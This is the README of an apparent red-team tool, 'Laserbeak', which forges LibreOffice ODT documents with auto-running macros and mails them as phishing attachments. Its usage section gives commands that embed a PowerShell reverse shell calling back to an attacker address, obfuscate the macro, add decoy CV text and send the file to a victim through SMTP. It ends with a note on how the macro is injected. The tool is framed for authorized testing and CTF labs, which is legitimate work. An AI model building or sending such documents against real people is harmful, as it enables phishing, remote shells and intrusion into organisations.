# Laserbeak — Decepticon Infiltration System

```
  _                        _                      _    
 | |    __ _ ___  ___ _ __| |__   ___  __ _  ___| | __
 | |   / _` / __|/ _ \ '__| '_ \ / _ \/ _` |/ __| |/ /
 | |__| (_| \__ \  __/ |  | |_) |  __/ (_| | (__|   < 
 |_____\__,_|___/\___|_|  |_.__/ \___|\__,_|\___|_|\_\

        [ Decepticon Infiltration System ]
        [ ODT Macro Injector — Phishing Forge ]
        [ Soundwave's eyes inside enemy lines ]
```

> *"Laserbeak, eject. Operation: Infiltration."*

Part of the **[Soundwave Decepticon Recon Suite](https://github.com/Starscream007/soundwave)**.

---

## What is Laserbeak ?

Laserbeak is a red team tool for generating **malicious LibreOffice ODT documents** with embedded Basic macros. Designed for authorized phishing simulations, CTF challenges, and penetration testing engagements.

It handles the full delivery chain :
- ODT document generation (blank or from template)
- Macro injection (AutoOpen trigger)
- Optional macro obfuscation via `chr()` encoding
- SMTP delivery via swaks

---

## Legal Disclaimer

This tool is intended **exclusively** for:
- Authorized penetration testing engagements
- CTF / lab environments (HackTheBox, TryHackMe, VulnLab, etc.)
- Security research and awareness training

**Using this tool against systems without explicit written authorization is illegal.**
The author assumes no responsibility for misuse.
Always operate within the scope defined by your Rules of Engagement (ROE).

---

## Installation

No external dependencies required — pure Python 3 stdlib.

```bash
git clone https://github.com/Starscream007/laserbeak
cd laserbeak
chmod +x laserbeak.py
```

Optional — for SMTP delivery:
```bash
sudo apt install swaks
```

---

## Usage

### forge — Build the malicious document

```bash
# Built-in PS reverse shell (no external tool needed)
python3 laserbeak.py forge --lhost 10.10.14.10 --lport 4444 -o evil.odt

# Base64 PS payload (penelope, msfvenom, etc.)
python3 laserbeak.py forge -p JABjAGwA... -o evil.odt

# Raw shell command
python3 laserbeak.py forge --cmd "cmd /c whoami > C:\Windows\Temp\out.txt" -o evil.odt

# Inject into existing ODT template
python3 laserbeak.py forge -i template.odt --lhost 10.10.14.10 --lport 4444 -o evil.odt

# Macro obfuscation (chr() encoding)
python3 laserbeak.py forge --lhost 10.10.14.10 --lport 4444 --obfuscate -o evil.odt

# Add decoy text content
python3 laserbeak.py forge --lhost 10.10.14.10 --lport 4444 --body "John Doe - Senior Developer" -o cv.odt

# Preset payloads
python3 laserbeak.py forge --preset calc -o test.odt
```

### deliver — Send via SMTP

```bash
python3 laserbeak.py deliver \
  --to victim@target.htb \
  --from applicant@attacker.htb \
  --server 10.10.11.X \
  --attach evil.odt \
  --subject "CV Application" \
  --mail-body "Please find my CV attached."
```

### Full chain

```bash
python3 laserbeak.py forge --lhost 10.10.14.10 --lport 4444 -o cv.odt && \
python3 laserbeak.py deliver \
  --to career@target.htb \
  --from applicant@target.htb \
  --server 10.10.11.X \
  --attach cv.odt \
  --subject "CV Application"
```

---

## Options

### forge

| Flag | Description |
|------|-------------|
| `-i, --input` | Base ODT template (blank document created if omitted) |
| `-o, --output` | Output file (default: `malicious.odt`) |
| `-p, --ps-payload` | Base64 PS payload wrapped in `powershell -e <payload>` |
| `--cmd` | Raw shell command |
| `--preset` | Preset: `calc`, `whoami`, `ping` |
| `--lhost` | LHOST for built-in PS reverse shell |
| `--lport` | LPORT (default: `4444`) |
| `--obfuscate` | Obfuscate macro via `chr()` encoding |
| `--body` | Decoy text content inside the document |

### deliver

| Flag | Description |
|------|-------------|
| `--to` | Recipient email address |
| `--from` | Sender email address |
| `--server` | SMTP server IP |
| `--port` | SMTP port (default: `25`) |
| `--attach` | ODT file to attach |
| `--subject` | Email subject |
| `--mail-body` | Email body text |

---

## How it works

LibreOffice Basic supports an `AutoOpen()` subroutine that fires automatically when a document is opened with macros enabled. Laserbeak injects this macro directly into the ODT zip structure without requiring LibreOffice to be installed on the attacker machine.

ODT files are ZIP archives containing XML files. Laserbeak manipulates:
- `Basic/Standard/Module1.xba` — the macro code
- `Basic/Standard/script-lc.xml` — library index
- `Basic/script-lc.xml` — libraries manifest
- `META-INF/manifest.xml` — patched to declare macro files

---

## Decepticon Suite

| Tool | Role |
|------|------|
| [Soundwave](https://github.com/Starscream007/soundwave) | Subdomain enumeration + web recon |
| [gMSA-decoder](https://github.com/Starscream007/gMSA-decoder) | gMSA blob decoding for AD attacks |
| **Laserbeak** | ODT macro injector + phishing forge |

---

*Till all are one.*
